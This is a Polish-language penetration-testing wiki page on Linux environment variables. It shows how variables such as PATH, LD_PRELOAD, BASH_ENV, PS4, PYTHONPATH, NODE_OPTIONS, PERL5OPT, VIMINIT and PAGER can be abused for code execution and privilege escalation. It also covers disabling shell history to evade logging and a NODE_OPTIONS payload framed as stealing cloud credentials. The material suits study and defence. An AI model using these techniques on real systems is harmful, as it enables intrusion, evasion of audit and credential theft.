# Zmienne środowiskowe Linuksa

{{#include ../../banners/hacktricks-training.md}}

## Zmienne globalne

Zmienne globalne **będą** dziedziczone przez **procesy potomne**.

Możesz utworzyć zmienną globalną dla bieżącej sesji, wykonując:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Ta zmienna będzie dostępna w bieżących sesjach i ich procesach potomnych.

Możesz **usunąć** zmienną, wykonując:

```bash
unset MYGLOBAL
```

## Zmienne lokalne

Do **zmiennych lokalnych** można uzyskać **dostęp** tylko z poziomu **bieżącej powłoki/skryptu**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Lista bieżących zmiennych

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Zawartość `/proc/*/environ` jest **rozdzielona znakami NUL**, więc te warianty są zwykle łatwiejsze do odczytania:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Jeśli szukasz **credentials** lub **interesującej konfiguracji usług** w odziedziczonych środowiskach, sprawdź również [Linux Post Exploitation](../post-exploitation/README.md).

## Typowe zmienne

Źródło: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – ekran używany przez **X**. Ta zmienna jest zwykle ustawiona na **:0.0**, co oznacza pierwszy ekran na bieżącym komputerze.
- **EDITOR** – preferowany edytor tekstu użytkownika.
- **HISTFILESIZE** – maksymalna liczba wierszy w pliku historii.
- **HISTSIZE** – liczba wierszy dodawanych do pliku historii po zakończeniu sesji użytkownika.
- **HOME** – katalog domowy.
- **HOSTNAME** – nazwa hosta komputera.
- **LANG** – bieżący język.
- **MAIL** – lokalizacja skrzynki pocztowej użytkownika. Zwykle **/var/spool/mail/USER**.
- **MANPATH** – lista katalogów przeszukiwanych w poszukiwaniu stron podręcznika.
- **OSTYPE** – typ systemu operacyjnego.
- **PS1** – domyślny prompt w bash.
- **PATH** – przechowuje ścieżki do katalogów zawierających pliki binarne, które można uruchamiać, podając ich nazwy, bez używania ścieżki względnej ani bezwzględnej.
- **PWD** – bieżący katalog roboczy.
- **SHELL** – ścieżka do bieżącej powłoki poleceń (na przykład **/bin/bash**).
- **TERM** – bieżący typ terminala (na przykład **xterm**).
- **TZ** – strefa czasowa.
- **USER** – bieżąca nazwa użytkownika.

## Zmienne interesujące dla hacking

Nie wszystkie zmienne są równie przydatne. Z perspektywy ofensywnej warto skupić się na zmiennych wpływających na **ścieżki wyszukiwania**, **pliki startowe**, **działanie dynamicznego linkera** lub **audyt/logowanie**.

### **HISTFILESIZE**

Zmień **wartość tej zmiennej na 0**, aby po **zakończeniu sesji** plik **historii** (\~/.bash_history) został **skrócony do 0 wierszy**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Zmień **wartość tej zmiennej na 0**, aby polecenia **nie były przechowywane w historii w pamięci** ani zapisywane z powrotem do **pliku historii** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Jeśli **wartość tej zmiennej jest ustawiona na `ignorespace` lub `ignoreboth`**, żadne polecenie poprzedzone dodatkową spacją nie zostanie zapisane w historii.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Ustaw **plik historii** na **`/dev/null`** lub całkowicie usuń tę zmienną. Zwykle jest to bardziej niezawodne niż samo zmienianie rozmiaru historii.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Procesy będą używać zadeklarowanego tutaj **proxy**, aby łączyć się z internetem za pośrednictwem **http lub https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: domyślny proxy dla narzędzi/protokołów, które go respektują.
- `no_proxy`: lista wyjątków (hosty/domeny/CIDR-y), które powinny łączyć się bezpośrednio.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Można używać wariantów zapisanych małymi lub wielkimi literami, w zależności od narzędzia (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesy będą ufać certyfikatom wskazanym w **tych zmiennych środowiskowych**. Jest to przydatne, aby narzędzia takie jak **`curl`**, **`git`**, klienci HTTP w Pythonie lub menedżery pakietów ufały urzędującemu CA kontrolowanemu przez atakującego (na przykład po to, aby proxy przechwytujące wyglądało na wiarygodne).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Jeśli uprzywilejowany wrapper/skrypt wykonuje polecenia **bez ścieżek bezwzględnych**, wygrywa **pierwszy katalog kontrolowany przez atakującego** w `PATH`. To prymityw wykorzystywany w wielu **PATH hijacks** w `sudo`, zadaniach cron, wrapperach powłoki i niestandardowych helperach SUID. Szukaj `env_keep+=PATH`, słabej wartości `secure_path` lub wrapperów, które wywołują polecenia takie jak `tar`, `service`, `cp`, `python` itp. po nazwie.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

W przypadku pełnych łańcuchów eskalacji uprawnień wykorzystujących `PATH` sprawdź [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` to nie tylko odwołanie do katalogu: wiele narzędzi automatycznie wczytuje **dotfiles**, **plugins** i **konfigurację użytkownika** z `$HOME` lub `$XDG_CONFIG_HOME`. Jeśli uprzywilejowany proces zachowuje te wartości, **config injection** może być łatwiejsze.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Interesujące cele obejmują `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` oraz pliki specyficzne dla narzędzi, takie jak `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Te zmienne wpływają na **dynamic linker**:

- `LD_PRELOAD`: wymusza wcześniejsze załadowanie dodatkowych obiektów współdzielonych.
- `LD_LIBRARY_PATH`: dodaje katalogi wyszukiwania bibliotek na początku listy.
- `LD_AUDIT`: ładuje biblioteki audytujące, które obserwują ładowanie bibliotek i rozwiązywanie symboli.

Są niezwykle przydatne do **hooking**, **instrumentation** i **privilege escalation**, jeśli uprzywilejowane polecenie je zachowuje. W trybie **secure-execution** (`AT_SECURE`, np. setuid/setgid/capabilities) loader usuwa lub ogranicza wiele z tych zmiennych. Błędy parsera na tym wczesnym etapie działania loadera nadal jednak mogą mieć poważne skutki, ponieważ występują **przed** uruchomieniem programu docelowego.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` zmienia wczesne działanie glibc (na przykład ustawienia alokatora) i jest bardzo przydatna w laboratoriach exploitów. Ma też znaczenie z punktu widzenia bezpieczeństwa, ponieważ **dynamiczny loader analizuje ją bardzo wcześnie**. Błąd **Looney Tunables** z 2023 roku przypomniał, że pojedyncza zmienna środowiskowa analizowana przez loader może stać się **prymitywem do lokalnej eskalacji uprawnień** w programach SUID.<sup>[[6]](#references)</sup>

W przypadku CVE-2023-4911 porównaj **wersję pakietu dystrybucji zainstalowaną w systemie** z poprawioną wersją dostawcy i sprawdź, który loader jest faktycznie używany przez nowe procesy. Sam numer wersji upstream jest niewiarygodny: Debian przeniósł podatny parser do swojego pakietu w wersji 2.31, a inne dystrybucje przeniosły poprawki bez zmiany numeru upstream. Praktyczna zmiana uprawnień wymaga też uprzywilejowanego pliku wykonywalnego, którego zmianie tożsamości nie blokuje `NoNewPrivs`, montowanie `nosuid` ani inne zabezpieczenie. Podczas pasywnej enumeracji unikaj uruchamiania sondy powodującej awarię przez nieprawidłowe `GLIBC_TUNABLES`. Informacje o dostępności poprawek dla poszczególnych wersji znajdziesz w [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) i [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911); [security notice](https://ubuntu.com/security/notices/USN-6409-1) Ubuntu zaleca również ponowne uruchomienie systemu po aktualizacji.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Jeśli **Bash** zostanie uruchomiony **nieinteraktywnie**, sprawdza `BASH_ENV` i wykonuje wskazany plik przed uruchomieniem docelowego skryptu. Gdy Bash jest wywoływany jako `sh` lub działa w interaktywnym trybie POSIX, może również sprawdzić `ENV`. To klasyczny sposób na doprowadzenie do wykonania kodu przez wrapper powłoki, jeśli środowisko jest kontrolowane przez atakującego.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignoruje te pliki startowe, gdy **rzeczywiste i efektywne identyfikatory są różne**; `-p` zachowuje efektywny identyfikator, ale nie włącza tych plików startowych, więc dokładne zachowanie zależy od tego, jak wrapper uruchamia powłokę. Zachowaj ostrożność w przypadku uprzywilejowanych wrapperów, które wywołują `setuid()`/`setgid()` **przed** uruchomieniem Bash: gdy identyfikatory znów będą zgodne, Bash może zaufać `BASH_ENV`, `ENV` i innym powiązanym ustawieniom powłoki, które w przeciwnym razie zostałyby zignorowane.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Gdy Bash działa z włączonym **xtrace**, rozwija `PS4` i wypisuje jego wartość przed każdym śledzonym poleceniem. `PS4` jest rozwijane tak jak prompt, więc zawarte w nim **podstawienie polecenia** zostaje wykonane. Co najważniejsze, xtrace można włączyć bezpośrednio z poziomu środowiska, eksportując `SHELLOPTS=xtrace` — nie trzeba podawać `-x` w wierszu poleceń — dzięki czemu każdy skrypt Bash uruchomiony przez ofiarę staje się sposobem na code execution.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` nie robi nic, dopóki xtrace nie jest aktywne (`SHELLOPTS=xtrace`, `set -x` lub `bash -x`), a Bash usuwa `SHELLOPTS` w kontekstach uprzywilejowanych/setuid, tak samo jak `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Te zmienne zmieniają sposób uruchamiania Pythona:

- `PYTHONPATH`: dodaje ścieżki wyszukiwania importów na początku listy.
- `PYTHONHOME`: zmienia lokalizację drzewa biblioteki standardowej.
- `PYTHONSTARTUP`: wykonuje plik przed wyświetleniem interaktywnego promptu.
- `PYTHONINSPECT=1`: przechodzi do trybu interaktywnego po zakończeniu skryptu.
- `PYTHONBREAKPOINT`: wywołuje `package.module.callable` (i importuje jego moduł), gdy kod dochodzi do `breakpoint()`.<sup>[[8]](#references)</sup>

Zmienne te są przydatne w przypadku skryptów konserwacyjnych, debuggerów, powłok i wrapperów, które uruchamiają Pythona ze środowiskiem, nad którym można zapanować. `python -E` i `python -I` ignorują wszystkie zmienne `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Niedawnym przykładem z rzeczywistego świata był exploit LPE **needrestart** z 2024 r. w systemach Ubuntu/Debian: skaner uruchomiony jako root skopiował `PYTHONPATH` nieuprzywilejowanego procesu z `/proc/<PID>/environ`, a następnie uruchomił Pythona. Opublikowany exploit umieścił `importlib/__init__.so` w ścieżce kontrolowanej przez atakującego, dzięki czemu Python wykonał kod atakującego podczas własnej inicjalizacji, zanim miało znaczenie, jaki skrypt uruchamiał helper.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ma równie przydatne zmienne startowe:

- `PERL5LIB`: dodaje katalogi bibliotek na początku ścieżki.
- `PERL5OPT`: wstrzykuje przełączniki tak, jakby były podane w każdym wierszu poleceń `perl`.

Może to wymusić **automatyczne ładowanie modułów** lub zmienić zachowanie interpretera, zanim skrypt docelowy zrobi cokolwiek interesującego. Perl ignoruje te zmienne w kontekstach **taint / setuid / setgid**, ale nadal mają one duże znaczenie w przypadku zwykłych wrapperów uruchamianych jako root, zadań CI, instalatorów i niestandardowych reguł sudoers.

Jeśli reguła sudo zezwala na nadpisywanie zmiennych środowiskowych, a uprzywilejowane polecenie ostatecznie uruchamia Perla, sprawdź także `PERL5DB`. Dokumentacja Perla podaje, że `PERL5OPT=-d` uruchamia debugger, a `PERL5DB` dostarcza kod inicjalizujący debugger, gdy Perl startuje z samym przełącznikiem `-d`. Usunięcie wyłącznie `PERL5LIB` i `PERLLIB` nie eliminuje tej możliwości. Zmienne muszą przetrwać działanie sudo i wrappera, a proces Perla nie może ich ignorować z powodu obsługi taint lub set-ID; podczas enumeracji sprawdź dokładną regułę i łańcuch wykonania, nie uruchamiając uprzywilejowanego helpera. Zobacz [opis zmiennych środowiskowych w perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Wbudowana ścieżka wyszukiwania Perla [`@INC`](https://perldoc.perl.org/perlvar#@INC) stanowi kolejną granicę zaufania dla modułów, nawet bez zachowanych zmiennych środowiskowych. W przypadku uprzywilejowanego procesu Perla powiąż rzeczywistą instrukcję `use` lub `require` z rozpoznaną nazwą modułu, kolejnością wyszukiwania oraz możliwością utworzenia lub podmiany tego modułu przez użytkownika o niższych uprawnieniach w jednym z przeszukiwanych katalogów. Sam fakt, że katalog biblioteki jest zapisywalny, nie dowodzi, że uprzywilejowany proces załaduje z niego kod.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **flagi CLI Node.js** na początku poleceń w każdym procesie `node`, który dziedziczy to środowisko. Dzięki temu zmienna ta może być przydatna w przypadku wrappers, zadań CI, helperów Electron i reguł sudo, które ostatecznie uruchamiają Node. Z punktu widzenia atakującego najciekawsze flagi to zazwyczaj:

- `--require <file>`: wczytuje plik CommonJS przed skryptem docelowym.
- `--import <module>`: wczytuje moduł ES przed skryptem docelowym.

Node odrzuca niektóre niebezpieczne flagi w `NODE_OPTIONS`, ale `--require` i `--import` są jawnie dozwolone i przetwarzane **przed** zwykłymi argumentami wiersza poleceń.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Bezplikowy preload z URL `data:`

Gdy możesz ustawić `NODE_OPTIONS`, ale **nie możesz zapisać pliku** na celu (system plików tylko do odczytu, ograniczone API, środowisko serverless itd.), `--import` akceptuje URL `data:text/javascript,`, więc cały payload znajduje się w samej zmiennej środowiskowej. JavaScript musi być **w całości zakodowany w formacie URL** — Node interpretuje tę wartość jako URL, więc każda niezakodowana spacja (lub inny niezakodowany znak) ucina payload i powoduje błąd `SyntaxError`. Działa to w Node 20.6+, gdzie `--import` znajduje się na liście dozwolonych opcji `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> To częsty sposób na przekształcenie kontroli nad `NODE_OPTIONS` w RCE w **zarządzanych środowiskach uruchomieniowych w chmurze**, których funkcje działają na Node. Na przykład atakujący, który może jedynie zmienić konfigurację Lambdy (`lambda:UpdateFunctionConfiguration`, bez `iam:PassRole` i bez aktualizacji kodu), może wstrzyknąć `NODE_OPTIONS=--import data:text/javascript,<payload>`, aby uruchomić kod wewnątrz funkcji i wykraść poświadczenia jej execution role. Wstrzyknięty moduł uruchamia się **przed** handlerem, który następnie nadal działa normalnie.

Łańcuchy gadgetów zdalnych, które pośrednio ustawiają `NODE_OPTIONS` (na przykład przez prototype pollution prowadzące do RCE), opisano [na tej stronie](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby umożliwia podobne nadużycia podczas uruchamiania:

- `RUBYLIB`: dodaje katalogi na początku ścieżki ładowania Ruby.
- `RUBYOPT`: wstrzykuje opcje wiersza poleceń, takie jak `-r`, do każdego wywołania `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Luki w zabezpieczeniach **needrestart** z 2024 roku pokazały, że nie jest to tylko sztuczka laboratoryjna: ten sam należący do roota helper, podatny na nadużycie `PYTHONPATH`, można było również skłonić do uruchomienia Ruby z kontrolowanym przez atakującego `RUBYLIB`, co powodowało załadowanie `enc/encdb.so` z katalogu atakującego.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim podczas normalnego uruchamiania wykonują polecenia Ex zawarte w `VIMINIT` (lub w zmiennej zastępczej `EXINIT`). Polecenia Ex obejmują `:!cmd` i `:call system(...)`, więc kontrolowanie tej zmiennej pozwala na code execution za każdym razem, gdy ofiara otwiera Vim (np. `sudo vim` jako root, `crontab -e`, `visudo`, `git`/`less` uruchamiające `$EDITOR` itd.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Tryb wsadowy (`vim -es`/`-Es`) pomija te zmienne, ale podczas normalnego uruchamiania interaktywnego są one wykonywane.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS i profiler CLR**

PowerShell Core (`pwsh`) działa w systemach Linux/macOS (i Windows) i jest **aplikacją .NET**, więc kilka zmiennych środowiskowych może spowodować wykonanie kodu przy każdym wywołaniu `pwsh` z odziedziczonym środowiskiem — przydatne w przypadku zadań cron/systemd, runnerów CI i uprzywilejowanych wrapperów uruchamiających `pwsh`.

- `PSModulePath`: PowerShell rekurencyjnie przeszukuje każdy katalog z tej listy w poszukiwaniu modułów `.psd1`/`.psm1` i **automatycznie ładuje** moduł, gdy po raz pierwszy zostanie użyte polecenie, które eksportuje. Dodaj katalog na początku listy, a kod na najwyższym poziomie modułu wykona się podczas importu; ponieważ rozpoznawanie nazw przebiega według kolejności *Alias → Function → Cmdlet*, eksportowana funkcja może nawet przesłonić wbudowany cmdlet wywoływany przez ofiarę.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: zmienia lokalizację `powershell/Microsoft.PowerShell_profile.ps1`, wykonywanego podczas uruchamiania (chyba że podano `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: zarządzany zestaw .NET, którego `StartupHook.Initialize()` jest uruchamiane przed `Main` (wspólny dla każdej aplikacji .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: API profilowania CLR ładuje bibliotekę atakującego do procesu podczas uruchamiania (zmienne ścieżek mają pierwszeństwo przed rejestrem; `DOTNET_*` to nowszy alias). W Windows PowerShell 5.1 (.NET Framework) użyj `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

W systemie Windows `PSExecutionPolicyPreference=Bypass` dodatkowo wyłącza zabezpieczenie blokujące niepodpisane skrypty, dzięki czemu umieszczony profil/moduł faktycznie się uruchamia. Pełne PoC znajdziesz na dedykowanej stronie:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Niektóre narzędzia nie tylko odczytują ścieżkę ze zmiennej środowiskowej — przekazują jej wartość do **powłoki**, **edytora** lub **preprocesora wejściowego**. Dlatego poniższe zmienne są szczególnie interesujące, gdy uprzywilejowany wrapper uruchamia `git`, `man`, `less` lub podobne przeglądarki tekstu:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: wybierają polecenie stronicera.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: wybierają polecenie edytora, często wraz z argumentami.
- `LESSOPEN`, `LESSCLOSE`: określają pre/postprocesory uruchamiane podczas otwierania pliku przez `less`.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git obsługuje również **wstrzykiwanie konfiguracji wyłącznie przez zmienne środowiskowe** bez zapisywania czegokolwiek na dysku za pomocą `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` i `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Z perspektywy post-exploitation pamiętaj też, że odziedziczone środowiska często zawierają **dane uwierzytelniające**, **ustawienia proxy**, **tokeny usług** lub **klucze chmurowe**. Zobacz [Linux Post Exploitation](../post-exploitation/README.md), aby dowiedzieć się o poszukiwaniu `/proc/<PID>/environ` i `Environment=` w `systemd`.

### PS1

Zmień wygląd swojego promptu.

[**Oto przykład**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Oto przykład](<../images/image (897).png>)

Zwykły użytkownik:

![PERL5OPT & PERL5LIB - PS1: Jeden, dwa i trzy zadania uruchomione w tle](<../images/image (740).png>)

Jeden, dwa i trzy zadania uruchomione w tle:

![PERL5OPT & PERL5LIB - PS1: Jeden, dwa i trzy zadania uruchomione w tle](<../images/image (145).png>)

Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie:

![PERL5OPT & PERL5LIB - PS1: Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie](<../images/image (715).png>)

## References

- [1] [Podręcznik GNU Bash - Pliki startowe Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - strona podręcznika systemu Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE w needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Dokumentacja Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Popularne zmienne środowiskowe - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - lokalna eskalacja uprawnień w ld.so biblioteki glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Podręcznik GNU Bash - zmienne Bash (`PS4`) i wbudowane polecenie Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Wbudowana funkcja breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Dokumentacja Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath i automatyczne ładowanie modułów PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Ustawienia konfiguracji debugowania i profilowania .NET (zmienne profilera `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
